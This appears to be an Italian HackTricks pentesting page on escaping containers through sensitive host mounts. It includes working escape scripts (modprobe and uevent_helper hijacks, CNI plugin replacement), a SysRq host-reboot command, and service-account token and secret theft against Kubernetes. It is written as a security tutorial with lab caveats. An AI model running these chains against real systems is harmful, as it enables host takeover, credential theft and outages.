# Mount host sensibili

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

I mount dell'host sono una delle superfici pratiche più importanti per evadere dai container, perché spesso annullano l'isolamento attentamente predisposto e ripristinano la visibilità diretta delle risorse dell'host. I casi pericolosi non si limitano a `/`. I bind mount di `/proc`, `/sys`, `/var`, dei socket di runtime, dello stato gestito da kubelet o di percorsi relativi ai dispositivi possono esporre controlli del kernel, credenziali, filesystem di container vicini e interfacce di gestione del runtime.

Questa pagina è separata dalle singole pagine sulle protezioni perché il modello di abuso riguarda più ambiti. Un mount host scrivibile è pericoloso in parte per via dei mount namespace, in parte per via degli user namespace, in parte per la copertura di AppArmor o SELinux e in parte per il percorso esatto dell'host esposto. Trattarlo come argomento autonomo rende molto più semplice ragionare sulla superficie di attacco.

Confronta anche una directory host scrivibile con il percorso corrispondente all'interno di ciascun container. Se è montata sopra una directory di script di avvio eseguibili, un utente host con privilegi inferiori potrebbe riuscire a inserire codice caricato dall'entrypoint di un container con privilegi superiori al riavvio successivo. Verifica la sorgente e la destinazione esatte del bind, i permessi di scrittura e ricerca della directory, il ciclo dell'entrypoint e il requisito di file eseguibile, l'UID del runtime e la presenza di una condizione reale che provochi il riavvio. L'UID 0 del container non corrisponde automaticamente all'UID 0 dell'host; l'effetto sull'host dipende dalla mappatura degli user namespace e dalla policy dei mount. Una verifica passiva dovrebbe segnalare i percorsi e i permessi senza scrivere uno script né riavviare il workload.

Un container Linux può trovarsi all'interno di una VM di gestione che condivide parte del filesystem di un host Windows separato. Le [cartelle condivise di VirtualBox](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) sono un modo per rendere visibili i file dell'host nel guest, ma root in quella VM è comunque un'identità distinta da quella di un amministratore Windows. Se la condivisione espone la chiave privata SSH leggibile di un utente, considerala un indizio relativo a una credenziale: verifica il mount esatto basato sull'host, la proprietà e i permessi di accesso della chiave, l'account corrispondente e l'**effettiva** policy delle chiavi autorizzate del server SSH Windows prima di concludere che consenta l'accesso all'host. Le versioni moderne di [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) usano spesso un file separato, `administrators_authorized_keys`, per gli account amministratore. Evita di includere i contenuti delle chiavi private nell'output delle normali attività di enumerazione; i metadati del mount e del percorso della chiave sono sufficienti per una verifica passiva.

## Esposizione di `/proc`

procfs contiene sia informazioni ordinarie sui processi sia interfacce di controllo del kernel ad alto impatto. Un bind mount come `-v /proc:/host/proc` o una vista del container che espone voci di proc in scrittura inaspettate può quindi causare divulgazione di informazioni, denial of service o esecuzione diretta di codice sull'host.

I percorsi di procfs di alto valore includono:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (in particolare `register` e `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Per prima cosa, verifica quali voci di procfs di alto valore sono visibili o scrivibili:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Questi percorsi sono interessanti per motivi diversi. `core_pattern`, `modprobe` e `binfmt_misc` possono diventare vettori di esecuzione di codice sull'host se sono scrivibili. `kallsyms`, `kmsg`, `kcore` e `config.gz` sono potenti fonti di ricognizione per il kernel exploitation. `sched_debug` e `mountinfo` rivelano il contesto dei processi, dei cgroup e del filesystem, e possono aiutare a ricostruire la struttura dell'host dall'interno del container.

Il valore pratico di ciascun percorso è diverso; trattarli tutti come se avessero lo stesso impatto rende più difficile il triage:

- `/proc/sys/kernel/core_pattern`
  Se è scrivibile, è uno dei percorsi procfs con l'impatto più elevato, perché dopo un crash il kernel esegue un pipe handler. Un container che può impostare `core_pattern` su un payload archiviato nel suo overlay o in un percorso host montato può spesso ottenere l'esecuzione di codice sull'host. Vedi anche [read-only-paths.md](protections/read-only-paths.md) per un esempio dedicato.
- `/proc/sys/kernel/modprobe`
  Questo percorso controlla l'helper userspace usato dal kernel quando deve invocare la logica di caricamento dei moduli. Se è scrivibile dal container e viene interpretato nel contesto dell'host, può diventare un altro primitive di esecuzione di codice sull'host. È particolarmente interessante se combinato con un modo per attivare il percorso dell'helper.
- `/proc/sys/vm/panic_on_oom`
  Di solito non è un primitive di escape pulito, ma può trasformare la pressione sulla memoria in un denial of service a livello di host, convertendo le condizioni OOM in un kernel panic.
- `/proc/sys/fs/binfmt_misc`
  Se l'interfaccia di registrazione è scrivibile, l'attaccante può registrare un handler per un valore magic scelto e ottenere l'esecuzione nel contesto dell'host quando viene eseguito un file corrispondente.
- `/proc/config.gz`
  Utile per il triage dei kernel exploit. Aiuta a determinare quali sottosistemi, mitigazioni e funzionalità kernel opzionali sono abilitati, senza bisogno dei metadati dei pacchetti dell'host.
- `/proc/sysrq-trigger`
  È soprattutto un percorso di denial of service, ma molto grave. Può riavviare, causare un panic o interrompere in altro modo l'host immediatamente.
- `/proc/kmsg`
  Rivela i messaggi del ring buffer del kernel. È utile per il fingerprinting dell'host, l'analisi dei crash e, in alcuni ambienti, per il leak di informazioni utili al kernel exploitation.
- `/proc/kallsyms`
  È prezioso se leggibile, perché espone le informazioni sui simboli kernel esportati e può aiutare a superare le ipotesi di randomizzazione degli indirizzi durante lo sviluppo di kernel exploit.
- `/proc/[pid]/mem`
  È un'interfaccia diretta alla memoria dei processi. Se il processo target è accessibile e sono soddisfatte le condizioni necessarie, simili a quelle di ptrace, può consentire di leggere o modificare la memoria di un altro processo. L'impatto reale dipende molto da credenziali, `hidepid`, Yama e restrizioni ptrace, quindi è un percorso potente ma subordinato a determinate condizioni.
- `/proc/kcore`
  Espone una vista della memoria di sistema simile a un'immagine core. Il file è enorme e scomodo da usare, ma se è effettivamente leggibile indica una superficie di memoria dell'host esposta in modo grave.
- `/dev/kmem` e `/dev/mem`
  Sono interfacce **device** raw-memory storicamente ad alto impatto, non file procfs. In molti sistemi moderni sono assenti o soggetti a forti restrizioni, ma un container che può aprire una copia montata dall'host dovrebbe considerare l'esposizione critica. Esaminali insieme agli altri mount sensibili di `/dev`, invece di cercare i percorsi inesistenti `/proc/kmem` o `/proc/mem`.
- `/proc/sched_debug`
  Fa leak di informazioni sullo scheduling e sui task, che possono rivelare le identità dei processi dell'host anche quando le altre viste dei processi sembrano più pulite del previsto.
- `/proc/[pid]/mountinfo`
  È estremamente utile per ricostruire dove si trova davvero il container sull'host, quali percorsi sono supportati da overlay e se un mount scrivibile corrisponde a contenuti dell'host o solo al layer del container.

Se `/proc/[pid]/mountinfo` o i dettagli dell'overlay sono leggibili, usali per ricavare il percorso host del filesystem del container:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Questi comandi sono utili perché diversi trucchi per l'esecuzione sull'host richiedono di convertire un percorso all'interno del container nel percorso corrispondente dal punto di vista dell'host.

### Esempio: preparare un percorso helper `modprobe`

Se `/proc/sys/kernel/modprobe` è scrivibile dal container e il percorso dell'helper viene interpretato nel contesto dell'host, può essere reindirizzato a un payload controllato dall'attaccante. La directory upper dell'overlay deve essere risolta dall'host e l'output di prova deve essere scritto nello stesso layer del container visibile dall'host, se il container non monta anche `/tmp` dell'host:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Il trigger esatto dipende dal target e dal comportamento del kernel e non viene deliberatamente ipotizzato. Ripristina il valore originale prima di lasciare il lab. Il punto importante è che un percorso helper scrivibile può reindirizzare una futura invocazione dell'helper del kernel verso contenuti del percorso host controllati dall'attaccante. L'assenza di un `upperdir` overlay, un percorso che l'host non riesce a risolvere, un mount sysctl in sola lettura o un kernel che non invoca mai l'helper selezionato interrompono questa catena.

### Esempio completo: ricognizione del kernel con `kallsyms`, `kmsg` e `config.gz`

Se l'obiettivo è valutare l'exploitability anziché ottenere subito l'escape:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Questi comandi aiutano a capire se sono visibili informazioni utili sui simboli, se i messaggi recenti del kernel rivelano stati interessanti e quali funzionalità o mitigazioni del kernel sono compilate. L’impatto di solito non consiste in un escape diretto, ma può ridurre drasticamente i tempi di triage delle vulnerabilità del kernel.

### Esempio completo: riavvio dell’host tramite SysRq

Se `/proc/sysrq-trigger` è scrivibile e raggiunge la vista dell’host:

```bash
echo b > /proc/sysrq-trigger
```

L'effetto è il riavvio immediato dell'host. Non è un esempio sottile, ma dimostra chiaramente che l'esposizione di procfs può essere molto più grave della divulgazione di informazioni.

## Esposizione di `/sys`

sysfs espone grandi quantità di stato del kernel e dei dispositivi. Alcuni percorsi sysfs sono utili principalmente per il fingerprinting, mentre altri possono influire sull'esecuzione degli helper, sul comportamento dei dispositivi, sulla configurazione dei moduli di sicurezza o sullo stato del firmware.

I percorsi sysfs di alto valore includono:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Questi percorsi sono rilevanti per motivi diversi. `/sys/class/thermal` può influire sul comportamento della gestione termica e quindi sulla stabilità dell'host in ambienti esposti in modo inadeguato. `/sys/kernel/vmcoreinfo` può causare leak di informazioni sui crash dump e sul layout del kernel, utili per il fingerprinting a basso livello dell'host. `/sys/kernel/security` è l'interfaccia `securityfs` usata dai Linux Security Modules, quindi un accesso inatteso può esporre o alterare lo stato relativo al MAC. I percorsi delle variabili EFI possono influire sulle impostazioni di avvio supportate dal firmware, rendendoli molto più rischiosi dei normali file di configurazione. `debugfs` in `/sys/kernel/debug` è particolarmente pericoloso perché è un'interfaccia pensata per gli sviluppatori e comporta aspettative di sicurezza molto meno rigorose rispetto alle API del kernel destinate agli ambienti di produzione protetti.

Ogni voce sysfs in questo elenco dipende da **kernel, configurazione e hardware**. I nodi virtualizzati attuali spesso non includono affatto `uevent_helper`, le variabili EFI e le voci dei dispositivi termici. Registra un percorso assente come prerequisito negativo, invece di presumere che un esempio relativo a un altro kernel sia applicabile.

I comandi utili per esaminare questi percorsi sono:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Cosa rende interessanti questi comandi:

- `/sys/kernel/security` può rivelare se AppArmor, SELinux o un altro LSM è esposto in un modo che avrebbe dovuto rimanere visibile solo dall’host.
- `/sys/kernel/debug` è spesso il risultato più allarmante di questo gruppo. Se `debugfs` è montato ed è leggibile o scrivibile, aspettati un’ampia superficie di accesso al kernel, il cui rischio specifico dipende dai nodi di debug abilitati.
- L’esposizione delle variabili EFI è meno comune, ma se presente ha un impatto elevato, perché riguarda impostazioni supportate dal firmware anziché normali file di runtime.
- `/sys/class/thermal` è rilevante soprattutto per la stabilità dell’host e l’interazione con l’hardware, non per una fuga agevole tramite shell.
- `/sys/kernel/vmcoreinfo` è principalmente una fonte per il fingerprinting dell’host e l’analisi dei crash, utile per comprendere lo stato del kernel a basso livello.

### Esempio completo: `uevent_helper`

`/sys/kernel/uevent_helper` dipende dal kernel e dalla configurazione e non è presente su molti sistemi attuali. Se esiste, è scrivibile ed è disponibile un trigger `uevent` utilizzabile, il kernel potrebbe eseguire un helper controllato dall’attaccante. L’output di prova deve usare un percorso visibile sia dalla vista dell’host sia da quella del container:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Il motivo per cui funziona è che il percorso dell'helper viene interpretato dal punto di vista dell'host. Una volta attivato, l'helper viene eseguito nel contesto dell'host, non all'interno del container corrente. `/sys/class/mem/null/uevent` è un trigger concreto nei kernel che lo espongono; altri dispositivi potrebbero esporre i propri file `uevent`, ma non sceglierne uno alla cieca su hardware reale. Ripristina il valore originale prima di uscire dal lab. Non segnalare questa tecnica come disponibile se il file dell'helper o un trigger controllato non sono presenti.

## Esposizione di `/var`

Montare `/var` dell'host in un container viene spesso sottovalutato perché non sembra drastico quanto montare `/`. In pratica, può bastare per raggiungere socket di runtime, directory di snapshot dei container, volumi dei pod gestiti da kubelet, token di service account proiettati e filesystem di applicazioni vicine. Nei nodi moderni, `/var` è spesso il luogo in cui si trova lo stato dei container più interessante dal punto di vista operativo.

### Esempio Kubernetes

Un pod con `hostPath: /var` spesso può leggere i token proiettati di altri pod e il contenuto degli snapshot overlay:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Questi comandi sono utili perché permettono di capire se il mount espone solo dati applicativi di scarso interesse o credenziali di cluster di grande impatto. Un token service-account leggibile può trasformare immediatamente l'esecuzione di codice locale in accesso all'API Kubernetes.

Se il token è presente, verifica a quali risorse consente di accedere, invece di fermarti alla sua individuazione:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

L'impatto può essere molto più ampio del semplice accesso al nodo locale. Un token con autorizzazioni RBAC estese può trasformare un `/var` montato in una compromissione dell'intero cluster.

### Esempio con Docker e containerd

Sugli host Docker, i dati pertinenti si trovano spesso in `/var/lib/docker`, mentre sui nodi Kubernetes basati su containerd potrebbero trovarsi in `/var/lib/containerd` o in percorsi specifici dello snapshotter:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Se il `/var` montato espone contenuti modificabili di snapshot appartenenti a un altro workload, l’attaccante potrebbe riuscire a modificare file dell’applicazione, inserire contenuti web o cambiare script di avvio senza toccare la configurazione del container corrente.

Su un **workload di laboratorio usa e getta**, i contenuti modificabili di uno snapshot possono dimostrare la manomissione dell’applicazione, il recupero di secret o il movimento laterale. Prima individua lo snapshot esatto corrispondente al container ID runtime e non modificare mai snapshot non pertinenti o di produzione:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Questi comandi sono utili perché mostrano le tre principali categorie di impatto associate al mount di `/var`: manomissione delle applicazioni, recupero di segreti e movimento laterale verso workload adiacenti.

Le scritture dirette agli snapshot aggirano la normale gestione dello stato del runtime e possono corrompere il container o distruggere prove. La ricognizione in sola lettura è stata riprodotta localmente con `overlay2` di Docker: un marker scritto in un container usa e getta adiacente è comparso sotto `/var/lib/docker/overlay2/<id>/diff/`. Limita le modifiche effettive agli snapshot a un container usa e getta creato per quel test.

## Stato di Kubelet, plugin e percorsi CNI

Un mount di `/var/lib/kubelet`, `/opt/cni/bin` o `/etc/cni/net.d` è spesso esposto tramite DaemonSet privilegiati, agenti CNI, plugin CSI per i nodi, operatori GPU e helper per lo storage. È facile liquidare questi mount come semplice "infrastruttura del nodo", ma si trovano direttamente nel percorso di esecuzione dei nuovi pod e spesso contengono credenziali di kubelet, segreti proiettati, socket di registrazione e binari eseguibili dei plugin lato host.

Tra i target di alto valore ci sono:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Comandi utili per l'analisi:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Perché questi percorsi sono importanti:

- `/var/lib/kubelet/pki` può esporre certificati client del kubelet e altre credenziali locali al nodo, che a volte possono essere riutilizzate contro l'API server o endpoint TLS accessibili al kubelet, a seconda della progettazione del cluster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` spesso contiene token service-account proiettati e Secrets montati per i pod vicini sullo stesso nodo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` è principalmente una superficie di ricognizione, ma molto utile: rivela quali pod e container utilizzano attualmente GPU, hugepages, dispositivi SR-IOV e altre risorse locali al nodo e scarse.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` e `/var/lib/kubelet/plugins_registry` rivelano quali plugin CSI, DRA e device sono installati e con quali socket è previsto che comunichi il kubelet. Se queste directory sono scrivibili anziché semplicemente leggibili, la vulnerabilità diventa molto più seria.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` e `/etc/cni/net.d` si trovano direttamente nel percorso di configurazione della rete dei pod. L'accesso in scrittura è spesso un primitivo di esecuzione sul host ritardato, non una semplice esposizione della configurazione.<sup>[[2]](#references)</sup>

### Esempio completo: `/opt/cni/bin` scrivibile

Se una directory host dei binari CNI è montata in lettura-scrittura, sostituire un plugin può essere sufficiente per ottenere l'esecuzione sul host la volta successiva che il kubelet crea una sandbox per un pod su quel nodo:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Questo non è immediato quanto un `docker.sock` montato, ma è spesso più realistico nei pod di infrastructure Kubernetes compromessi. Il marker viene scritto accanto al plugin montato, così il container può recuperarlo anche senza un mount di host-root o di host-`/tmp`. Il wrapper preserva gli argomenti originali e lo standard input, quindi l’esempio ripristina il binario originale. Il punto importante è che il binario modificato viene eseguito in seguito dal flusso di configurazione della rete host, non dal container corrente. Usate solo un nodo sacrificabile, perché un wrapper non valido può impedire ai nuovi sandbox dei Pod di ottenere connettività di rete.

## Socket di runtime

I mount host sensibili includono spesso socket di runtime anziché directory intere. Sono così importanti che vale la pena ripeterlo esplicitamente qui:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Vedi [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) per i flussi completi di exploitation una volta montato uno di questi socket.

Come rapido schema iniziale di interazione:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Se una di queste operazioni riesce, il percorso da «socket montato» a «avviare un container sibling più privilegiato» è di solito molto più breve di qualsiasi percorso di kernel breakout.

Lo stesso accesso al daemon può anche consentire di stabilire la **persistence sull’host**. Un container helper con un bind mount scrivibile della root dell’host può ricevere file tramite `docker cp`, quindi usare `docker exec` per inserire una chiave SSH, un’unità di servizio o un altro file di persistence nel percorso host montato. Il confine di sicurezza è l’autorità del daemon di creare il mount host; `docker cp` è solo una fase di staging. Quando un socket runtime viene esposto, controlla sia i container creati di recente sia le scritture nei percorsi host di autenticazione o di avvio.

## Hijack di task tramite percorsi host scrivibili

Un mount host scrivibile non deve necessariamente esporre `/` per essere pericoloso. Se il percorso montato contiene script, file di configurazione, hook, plugin o file utilizzati in seguito da un task pianificato o da un servizio lato host, il container potrebbe essere in grado di modificare ciò che l’host esegue.

Flusso generico di revisione:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Se un file scrivibile viene utilizzato da un processo dell’host, mantieni il payload semplice e osservabile durante i test:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

La parte interessante è il confine di fiducia: la scrittura avviene dall'interno del container, ma l'esecuzione avviene successivamente nel contesto del servizio host. Questo trasforma un hostPath o bind mount limitato in una primitiva di esecuzione ritardata di codice sull'host.

## File di proprietà di root su un percorso host condiviso

Un account del container che può diventare root potrebbe riuscire a collocare un file di proprietà di root su un percorso scrivibile usato anche dall'host. Se l'UID 0 del container corrisponde all'UID 0 dell'host, entrambe le viste fanno riferimento allo stesso file e il mount dell'host consente l'esecuzione SUID, un utente host che può eseguire un eseguibile SUID di proprietà di root su quel percorso potrebbe oltrepassare il confine dei privilegi dell'host. Per questo specifico problema relativo alla proprietà dei file, il container non deve essere eseguito con `--privileged`. Vedi [mappature degli user namespace](protections/namespaces/user-namespace.md) e la [discussione su SUID](privileged-containers.md) per le condizioni distinte.

Esamina il percorso da **entrambi i lati**: confronta la proprietà e l'identità di un file innocuo, controlla `uid_map` e `gid_map` del container e ispeziona le opzioni di mount e le policy di esecuzione dell'host. `rw` lato container senza `nosuid` è solo un possibile indizio; non permette di stabilire la proprietà sull'host, i flag di mount dell'host, l'accesso di un utente host o se AppArmor/SELinux blocca l'esecuzione. `noexec` limita l'esecuzione nella vista in cui si applica. I tag `shared:` e `master:` in `/proc/self/mountinfo` descrivono la propagazione dei mount, non indicano se i contenuti del file sono condivisi con l'host. Un bind mount potrebbe non avere questi tag. Il riutilizzo di credenziali che consente l'accesso all'host è un passaggio distinto dal superamento del confine dei privilegi tramite file condivisi.

Lo storage del runtime dell'host può creare un percorso simile anche senza un bind mount esplicito. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) consentiva a un utente host non privilegiato di attraversare le sottodirectory dei dati di Docker ed eseguire file da un filesystem del container; Moby ha corretto i permessi nella versione 20.10.9 e precisa che i container in esecuzione devono essere riavviati per correggere le relative directory. Esamina i percorsi esatti montati `overlay2/<id>/merged` e i permessi di ricerca di ciascuna directory genitore, quindi verifica se l'UID 0 del container corrisponde all'UID 0 dell'host, se è presente e raggiungibile un vero eseguibile SetUID di proprietà di root e se la vista dell'host consente l'esecuzione SetUID. I container rootless o con rimappatura degli user namespace, `nosuid`, `noexec`, `no_new_privs` e le policy MAC possono modificare il risultato. La versione del runtime o un percorso attraversabile, da soli, sono spunti per una verifica, non prove dell'esecuzione con privilegi di root sull'host; ispeziona i metadati di mount e file senza eseguire un possibile eseguibile.

## CVE relative ai mount

I mount dell'host sono anche coinvolti nelle vulnerabilità del runtime. Tra gli esempi recenti più importanti:

- `CVE-2024-21626` in `runc`, in cui un file descriptor di directory trapelato poteva collocare la directory di lavoro sul filesystem dell'host.
- `CVE-2024-23651`, `CVE-2024-23652` e `CVE-2024-23653` in BuildKit, in cui Dockerfile, frontend e flussi `RUN --mount` malevoli potevano reintrodurre l'accesso ai file dell'host, la loro eliminazione o privilegi elevati durante le build.
- `CVE-2024-1753` nei flussi di build di Buildah e Podman, in cui bind mount appositamente creati durante la build potevano esporre `/` in lettura e scrittura.
- `CVE-2025-47290` in `containerd` 2.1.0, in cui una condizione TOCTOU durante l'estrazione di un'immagine poteva consentire a un'immagine appositamente creata di modificare il filesystem dell'host durante il pull.

Queste CVE sono pertinenti perché dimostrano che la gestione dei mount non dipende solo dalla configurazione dell'operatore. Anche il runtime stesso può introdurre condizioni di escape basate sui mount.

## Verifiche

Usa questi comandi per individuare rapidamente le esposizioni ai mount di maggior valore:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Cosa è interessante qui:

- La root dell'host, `/proc`, `/sys`, `/var` e i socket runtime sono tutti risultati ad alta priorità.
- Le voci proc/sys scrivibili spesso indicano che il mount espone controlli del kernel globali per l'host, anziché una vista sicura del container.
- I percorsi `/var` montati richiedono un'analisi delle credenziali e dei workload adiacenti, non solo del filesystem.
- Le directory di stato di Kubelet e i percorsi CNI/plugin meritano la stessa priorità dei socket runtime, perché spesso si trovano direttamente sul percorso di creazione dei pod e distribuzione delle credenziali del nodo.

## Stato della validazione locale

Le catene pratiche descritte in questa pagina sono state verificate su un nodo Linux minikube locale. La validazione ha riprodotto:

- accesso in lettura e scrittura tramite un hostPath temporaneo scrivibile
- individuazione dei token ServiceAccount proiettati e dei Secret montati tramite `/var/lib/kubelet/pods`
- autenticazione riuscita all'API Kubernetes con un token attivo recuperato dallo stato Kubelet montato
- individuazione in sola lettura di un filesystem Docker `overlay2` adiacente tramite `/var` montato
- creazione tramite Docker API di un container fratello con un bind host in sola lettura tramite un `docker.sock` montato
- esecuzione differita sull'host tramite un hook temporaneo utilizzato dall'host
- simulazione di un wrapper CNI che ha preservato gli argomenti, l'input standard e l'esecuzione del plugin originale

Lo stesso nodo esponeva `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` e `config.gz`, ma non esponeva `uevent_helper`, variabili EFI, voci termiche o `sched_debug`. Non sono stati eseguiti trigger kernel distruttivi. Questo conferma che le catene basate su root dell'host, `/var`, stato Kubelet, socket e consumer dell'host sono riproducibili, mentre le tecniche basate su helper procfs/sysfs devono restare condizionali al kernel esatto, alla modalità di mount, al percorso del payload e al trigger.

## References

- [1] [File e percorsi locali utilizzati da Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Il container cilium-agent può accedere all'host tramite un mount `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
